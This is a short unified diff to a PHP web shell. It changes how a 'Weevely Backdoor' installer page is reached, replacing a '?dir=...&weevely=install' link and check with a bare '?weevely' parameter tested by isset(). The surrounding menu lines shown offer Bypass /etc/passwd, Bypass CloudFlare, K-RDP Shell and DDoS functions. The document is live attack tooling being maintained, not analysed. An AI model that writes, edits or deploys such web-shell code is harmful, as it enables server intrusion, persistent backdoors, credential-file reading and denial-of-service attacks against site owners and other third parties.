@@ -698,7 +698,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=vhosts'>Bypass Vhost</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=etcpass'>Bypass /etc/passwd</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&bypass=cloudfl'>Bypass CloudFlare</a>";
-  echo "<a style='border:1px groove cyan;' href='?dir=$dir&weevely=install'>Weevely</a>";
+  echo "<a style='border:1px groove cyan;' href='?weevely'>Weevely</a>";
   echo " <p>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ddos'>DDoS</a>";
@@ -845,7 +845,7 @@ ___  ___         ______                 _              _
     $error = "<center><font color='red'>$mesg</font></center>";
     echo "$error";
   }
-  elseif ($_GET['weevely'] == 'install') {
+  if (isset($_GET['weevely'])) {
     echo "<center><h3>Weevely Backdoor</h3>
     <form action='' method='post'>
     Directory to install weevely backdoor:<br>
